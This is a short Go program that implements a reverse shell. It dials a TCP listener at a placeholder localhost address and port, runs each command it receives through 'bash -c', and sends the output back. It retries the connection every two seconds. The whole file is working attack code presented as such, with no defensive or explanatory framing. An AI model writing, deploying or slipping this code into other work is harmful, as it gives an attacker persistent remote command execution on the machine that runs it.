package main

import (
	"bufio"
	"net"
	"os/exec"
	"time"
)

func main() {
	// putting all in Never ending loop
	for {

		IpAddr := "127.0.0.1" // Declaring Listener IP Address
		Port := "5555"        // Declaring Listener Port

		connect, err := net.Dial("tcp", IpAddr+":"+Port) // Using Net.Dial to connect to the listener socket, using TCP Protocol

		// Connecting back to listener after every 2 seconds and handling error
		if nil != err {
			if nil != connect {
				connect.Close()
			}
			time.Sleep(2 * time.Second) // 2 seconds sleep, retry after every 2 seconds to connect back
			main()
		}

		// declaring reader
		read := bufio.NewReader(connect)

		for {

			// Getting received command from listener
			command, err := read.ReadString('\n')

			// Handling error
			if nil != err {
				connect.Close()
				main()
				return
			}

			cmd := exec.Command("bash", "-c", command) // executing command recieved here
			out, _ := cmd.CombinedOutput()             // getting output of executed command

			connect.Write(out) // writing, that, sending output to the listener
		}
	}
}
